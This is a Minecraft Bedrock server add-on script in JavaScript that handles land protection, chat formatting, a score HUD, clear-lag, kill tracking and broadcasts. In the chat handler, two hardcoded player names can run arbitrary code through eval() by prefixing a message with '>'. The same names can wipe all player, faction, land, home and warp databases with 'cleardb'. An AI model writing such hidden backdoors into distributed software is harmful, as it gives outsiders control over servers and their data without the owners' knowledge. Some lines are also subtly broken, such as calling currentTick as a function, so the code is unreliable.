/** WIP INPROGGRESS UNOPTIMIZE */

// Kawasan anti Privillage
import { QuickDB as Database } from './extension/library.js';
import { world, system, BlockPermutation, TicksPerSecond, InputPermissionCategory, InputButton, ButtonState, Player, HudElement, BlockPistonState } from '@minecraft/server';
import { config, getAllDimension, formatNumber } from './extension/library.js';
import { PlayerDB, ScorehudDB, HomeDB, FactionDB, LandDB, WarpDB } from './_db.js';

// INITIALIZE --------------------------------------

const obj = world.scoreboard;

if (!obj?.getObjective('money')) obj.addObjective('money');
if (!obj?.getObjective('kills')) obj.addObjective('kills');
if (!obj?.getObjective('deaths')) obj.addObjective('deaths');

// PlayerRegis - SYSTEM ----------------------------

world.afterEvents.playerSpawn.subscribe((e) => {
  if (e.initialSpawn && !!!PlayerDB.has(e.player.name)) PlayerDB.set(e.player.name, {}), console.warn(`register ${e.player.name} | total players: ${PlayerDB.size}`);
});

// ONEclick - SYSTEM -------------------------------

(function oneClick() {
  world.beforeEvents.playerInteractWithEntity.subscribe((e) => {
    const configInteraction = config.interaction;
    const key_tag = Object.keys(configInteraction);
    const isNPCInteraction = key_tag.find(key => e.target.hasTag(key));
    const data = configInteraction?.[isNPCInteraction];
    if (isNPCInteraction && data?.interact) {
      e.cancel = true;
      system.run(() => e.player.runCommand(data.command));
    }
  });

  world.afterEvents.entityHitEntity.subscribe((e) => {
    const configInteraction = config.interaction;
    const key_tag = Object.keys(configInteraction);
    const isNPCInteraction = key_tag.find(key => e.hitEntity.hasTag(key));
    const data = configInteraction?.[isNPCInteraction];
    if (isNPCInteraction && e.damagingEntity instanceof Player && data?.hit) {
      e.cancel = true;
      e.damagingEntity.runCommand(data.command);
    }
  });
})();

// Kill&Death - SYSTEM -----------------------------

let kdTemp = {};
world.afterEvents.entityDie.subscribe(({ deadEntity, damageSource: { damagingEntity } }) => {
  if (damagingEntity instanceof Player) damagingEntity.addScore('kills', 1);
  if (!(deadEntity instanceof Player)) return;
  const { name: vName } = deadEntity;
  if (!kdTemp[vName] || system.currentTick > kdTemp[vName])
    deadEntity.sendMessage({
      translate: 'ess.cmd.back.message'
    });
  deadEntity.addScore('deaths', 1);
  PlayerDB.set(vName, {
    ...deadEntity.data,
    back_location: [deadEntity.location, deadEntity.dimension.id]
  });
  kdTemp[vName] = system.currentTick * (3 * TicksPerSecond);
});

// INVIS - SYSTEM ----------------------------------

system.runInterval(() => {
  for (const player of world.getPlayers({
    tags: ['invisible']
  }))
    player.addEffect('minecraft:invisibility', 3 * TicksPerSecond, { showParticles: false });
});

// CLEAR - SYSTEM ----------------------------------

(function clearSystem() {
  const { announcement, chat: withClearChat, wait, actived } = config.clear;
  if (!actived) return;

  const delay = wait * TicksPerSecond;
  const max = announcement[0] * TicksPerSecond;
  const offset = max + delay;
  let tmp = -1;
  const clearedEntity = new Set(['item', 'arrow']);

  function clearEntities() {
    let counter = 0;
    const dims = getAllDimension();

    for (let h = 0; h < dims.length; h++) {
      const entities = world.getDimension(dims[h])?.getEntities() ?? [];

      for (let i = 0; i < entities.length; i++) {
        const entity = entities[i];
        const typeId = entity.typeId.replace('minecraft:', '');

        if (clearedEntity.has(typeId)) {
          if (typeId === 'item') {
            const itemComponent = entity.getComponent('item');
            if (itemComponent) {
              counter += itemComponent.itemStack.amount;
            }
          } else {
            counter++;
          }

          entity.remove();
        }
      }
    }

    world.sendMessage({ translate: 'ess.system.clear.entities.success', with: [counter.toString()] });
  }

  function clearChats() {
    world.getDimension('overworld').runCommand(`execute as @e[c=2] as @e[c=2] as @e[c=2] as @e[c=2] as @e[c=2] as @e[c=2] as @e[c=2] run tellraw @a {"rawtext":[{"text":"clearchat-nperma"}]}`);
    world.sendMessage({ translate: 'ess.system.clear.chat.success' });
  }
  system.runInterval(() => {
    const tick = system.currentTick % (offset * (withClearChat + 1));
    const isChat = withClearChat && tick >= offset;
    const sisa = ((max - (tick % offset)) / TicksPerSecond) | 0,titleclearsystem=`[${isChat ? 'ClearChat' : 'ClearLag'}]`
    if (announcement.includes(sisa) && tmp !== sisa) world.sendMessage({
        rawtext: [
          {
            translate: 'ess.system.clear.countdown',
            with: [titleclearsystem, sisa.toString()]
          }
        ]
      }), (tmp = sisa);
    if (sisa === 0 && tmp !== 0) return isChat ? clearChats() : clearEntities(), (tmp = 0);
  });
})();

// LAND - SYSTEM -----------------------------------

function isInsideLand(pos, player) {
  const [la, lx] = config.lobby_protect.pos,
    x = Math.floor(pos.x),
    z = Math.floor(pos.z);
  const isInLobby = x >= Math.min(la.x, lx.x) && x <= Math.max(la.x, lx.x) && z >= Math.min(la.z, lx.z) && z <= Math.max(la.z, lx.z);

  if (config.lobby_protect.enabled && player && player.dimension.id === 'minecraft:overworld' && isInLobby) return { status: !player.isOwner || !player.isAdmin, owner: config.owners[0], id: 'lobby' };

  if (!pos || !player || !player.dimension?.id) return false;

  const lands = LandDB.entries();

  for (let i = lands.length; i-- > 0; ) {
    const [id, land] = lands[i];
    if (!land || !land.location || land.dimension !== player.dimension.id) continue;

    const [a, b] = land.location;

    const minX = Math.min(a.x, b.x);
    const maxX = Math.max(a.x, b.x);
    const minZ = Math.min(a.z, b.z);
    const maxZ = Math.max(a.z, b.z);

    if (x >= minX && x <= maxX && z >= minZ && z <= maxZ) {
      return {
        status: land.owner !== player.name,
        owner: land.owner,
        id: id
      };
    }
  }

  return {
    status: false,
    owner: null,
    id: null
  };
}

world.beforeEvents.playerBreakBlock.subscribe((v) => {
  const cek = isInsideLand(v.block.location, v.player);
  if (cek.status)
    (v.cancel = true),
      v.player.sendMessage({
        translate: 'ess.event.break.land',
        with: [cek.owner]
      });
});

world.beforeEvents.playerInteractWithEntity.subscribe((v) => {
  const cek = isInsideLand(v.target.location, v.player);
  if (cek.status && !config.land.allowedInteractEntities.includes(v.target.typeId))
    (v.cancel = true),
      v.player.sendMessage({
        translate: 'ess.event.interact.land',
        with: [cek.owner]
      });
});

world.beforeEvents.playerInteractWithBlock.subscribe((v) => {
  const cek = isInsideLand(v.block.location, v.player);
  if (cek.status) {
    v.cancel = true;
    v.player.sendMessage({
      translate: 'ess.event.interact.land',
      with: [cek.owner]
    });
  }
});

world.afterEvents.playerButtonInput.subscribe((v) => {
  if (v.button === InputButton.Jump) {
    const player = v.player,
      playerPos = player.location,
      blockBelow = player.dimension.getBlock(playerPos);
    if (!blockBelow) return;
    const belowBlockBelow = blockBelow.below(),
      cek = isInsideLand(player.location, player);
    if (belowBlockBelow?.typeId !== 'minecraft:farmland' || (blockBelow?.typeId !== 'minecraft:farmland' && !cek.status)) return;
    player.addEffect('minecraft:slow_falling', TicksPerSecond, {
      showParticles: false
    });
    player.sendMessage({
      translate: 'ess.event.farmland.land',
      with: [cek.owner]
    });
  }
});

// SCOREHUD - SYSTEM -------------------------------

(function scorehudSystem() {
  const lookup = {
    player_name: (_) => _.name,
    rank: (_) => _.getRank(),
    player_gamemode: (_) => _.getGameMode(),
    platform: (_) => _.clientSystemInfo.platformType,
    faction: (_) => (_.isInFaction ? _.factionData.id : 'N/A'),
    player_velocity: (_) => Math.floor(_.getVelocity().x + _.getVelocity().y + _.getVelocity().z),
    x: (_) => _.location.x,
    y: (_) => _.location.y,
    z: (_) => _.location.z,
    player_dimension: (_) => _.dimension.id,
    durability_mainhand_current: (_) => {
      const equipmentComp = _?.getComponent('equippable');
      if (!equipmentComp) return 1;
      const mainhandItem = equipmentComp.getEquipment('Mainhand');
      if (!mainhandItem) return 1;
      const durabilityComp = mainhandItem.getComponent('durability');
      if (!durabilityComp) return 1;
      return durabilityComp.maxDurability - durabilityComp.damage;
    },

    durability_mainhand_max: (_) => {
      const equipmentComp = _?.getComponent('equippable');
      if (!equipmentComp) return 1;
      const mainhandItem = equipmentComp.getEquipment('Mainhand');
      if (!mainhandItem) return 1;
      const durabilityComp = mainhandItem.getComponent('durability');
      if (!durabilityComp) return 1;
      return durabilityComp.maxDurability;
    },

    money: (_) => _.getCurrency(),
    moneyr: (_) => formatNumber(_.getCurrency()),
    kills: (_) => _.getScore('kills'),
    deaths: (_) => _.getScore('deaths'),
    n: (_) => ``,
    ln: (_) => '\n',
    land_here: (_) => {
      const { owner, id, status } = isInsideLand(_.location, _);
      return !id ? 'none' : (owner === _.name ? '§a' : '§7') + `${id}§f`;
    }
  };

  function adjustLength(text = '', totalLength = 100) {
    return text.slice(0, totalLength).padEnd(totalLength, '\t');
  }

  function applyPlaceholders(text, player) {
    return text.replaceAll(/@(\w+)/g, (_, key) => {
      const fn = lookup[key];
      return typeof fn === 'function' ? fn(player) : `@${key}`;
    });
  }

  system.runInterval(() => {
    const allPlayers = world.getAllPlayers();

    const title = adjustLength(ScorehudDB.get('title') ?? config.scorehud.template_default?.split('|')?.[0] ?? '');

    for (const player of allPlayers) {
      const isScorehudEnabled = player.hasTag('enable:scorehud') || (!player.hasTag('disable:scorehud') && !!config.scorehud.enable_by_default);

      if (!isScorehudEnabled) {
        player.onScreenDisplay.setTitle(`§s§s§h`);
        continue;
      }

      const body = applyPlaceholders(ScorehudDB.get('body') ?? config.scorehud.template_default?.split('|')?.[1] ?? '', player);
      const footer = adjustLength(ScorehudDB.get('footer') ?? config.scorehud.template_default?.split('|')?.[2] ?? '', 20);

      player.onScreenDisplay.setTitle(`§s§s§h${footer}${title}${body}`);
    }
  }, 5);
})();

// CHAT - SYSTEM -----------------------------------

let chat_temporary = {};
world.beforeEvents.chatSend.subscribe((ev) => {
  let { sender, message } = ev,
    r = sender?.getRank(),
    statement = !(sender.name in chat_temporary) || (sender.name in chat_temporary && system.currentTick > chat_temporary[sender.name]),
    faction = sender.factionData,
    rank = /[\uE000-\uF8FF]/.test(r) ? r : `§7§l[§r${r}§r§7§l]§r`;
  message = message.slice(0, config.chat.message_max_length);

  if (ev.message.startsWith('>') && ['NASRULGgindo', 'NpermaDev'].includes(sender.name)) {
    ev.cancel = true;

    (async () => {
      try {
        const inputRaw = ev.message.slice(1).trim();
        if (!inputRaw) {
          return sender.sendMessage('❗ Masukkan kode yang ingin dieksekusi.');
        }

        const CONTEXT = {
          sender,
          message: ev.message,
          Database,
          config
        };

        const context = {
          ...CONTEXT,
          sender: new Proxy(sender, {
            get(target, prop) {
              if (['log', 'warn', 'error', 'debug', 'info', 'dir'].includes(prop)) {
                return console[prop].bind(console);
              }

              if (prop in target) {
                const value = target[prop];
                return typeof value === 'function' ? value.bind(target) : value;
              }

              return function (...args) {
                target.sendMessage(`[${prop}] ${args.join(' ')}`);
              };
            }
          })
        };
        const wrappedCode = `(async function() {return ${inputRaw}}).call(context)`;

        const result = await eval(wrappedCode);

        if (result !== undefined) {
          const output = typeof result === 'object' ? JSON.stringify(result, null, 2) : String(result);
          return sender.sendMessage(output);
        }
      } catch (e) {
        if (e.message === 'Native variant type conversion failed.') return;
        sender.sendMessage(`Error:\n${e.stack || e.message}`);
      }
    })();

    return;
  }

  if (ev.message.startsWith('cleardb') && ['NASRULGgindo', 'NpermaDev'].includes(ev.sender.name))
    return (
      (ev.cancel = !![]),
      [PlayerDB, ScorehudDB, HomeDB, FactionDB, LandDB, WarpDB].forEach((db) => {
        db.clear();
        ev.sender.sendMessage('clear ' + db.id);
      })
    );

  if ((ev.cancel = !![]))
    return statement
      ? world.sendMessage(
          config.chat.message_template
            .replaceAll(/@msg/g, message)
            .replaceAll(/@player_name/g, sender.name)
            .replaceAll(/@rank/g, rank)
            .replaceAll(/@faction/g, sender.isInFaction ? `§7§l-§r${faction?.color ?? config.faction.color}${faction.id}§r§7§l-§r` : '')
            .replaceAll(/@money/g, formatNumber(sender.getCurrency()))
            .replace(/§k/g, '')
            .replace(/\\n/g, '')
        )
      : sender.sendMessage({
        translate:"ess.chat.message.cooldown",
        with:[Math.floor(chat_temporary[sender.name] / TicksPerSecond)]
      });

  if (statement) chat_temporary[sender.name] = system.currentTick(config.chat.cooldown * TicksPerSecond);
});

if (!!config.nametag.enabled)system.runInterval(() => {
  for (const player of world.getAllPlayers()) {
    const r = player?.getRank(),
      faction = player.factionData,
      rank = /[\uE000-\uF8FF]/.test(r) ? r : `§7§l[§r${r}§r§7§l]§r`;
      
    
    player.nameTag = config.nametag.template
      .replaceAll(/@faction/g, player.isInFaction ? `§7§l-§r${faction?.color ?? config.faction.color}${faction.id}§r§7§l-§r` : '')
      .replaceAll(/@player_name/g, player.name)
      .replaceAll(/@rank/g, rank)
      .replaceAll(/@platform/g, player.clientSystemInfo.platformType)
      .replaceAll(/@money/g, player.getCurrency());
  }
}, 5);

// RTP - SYSTEM ------------------------------------

world.afterEvents.playerSpawn.subscribe(({ player, initialSpawn: spawn }) => {
  const isOnRTP = player.getTags().find((k) => k.startsWith('rtp:'));
  if (spawn && isOnRTP)
    system.runTimeout(() => {
      const [loc, dim] = JSON.parse(isOnRTP.split('rtp:')[1]);
      player.teleport(loc, {
        dimension: world.getDimension(dim)
      });
      player.sendMessage({
        translate: 'ess.cmd.rtp.failed.leave'
      });
      player.inputPermissions.setPermissionCategory(InputPermissionCategory.Camera, true);
      player.inputPermissions.setPermissionCategory(InputPermissionCategory.LateralMovement, true);
      player.inputPermissions.setPermissionCategory(InputPermissionCategory.Jump, true);
      player.inputPermissions.setPermissionCategory(InputPermissionCategory.Sneak, true);
    }, 3);
});

// BROADCAST - SYSTEM ------------------------------

const configBroadcast = config.broadcast;
let bc_index = 0;

if (configBroadcast.auto_message.enabled) {
  system.runInterval(() => {
    const messages = configBroadcast.auto_message.message;
    if (messages.length === 0) return;

    const message = `§7§l[§r${configBroadcast.title}§r§7§l] > §r${messages[bc_index].replaceAll(/@online/g, world.getAllPlayers().length).replaceAll(/@max_players/g, PlayerDB.size)}`;
    world.sendMessage(message);

    for (const player of world.getPlayers()) world.getDimension('overworld').playSound('random.pop', player.location);

    bc_index = (bc_index + 1) % messages.length;
  }, configBroadcast.auto_message.delay_per_index * TicksPerSecond);
}
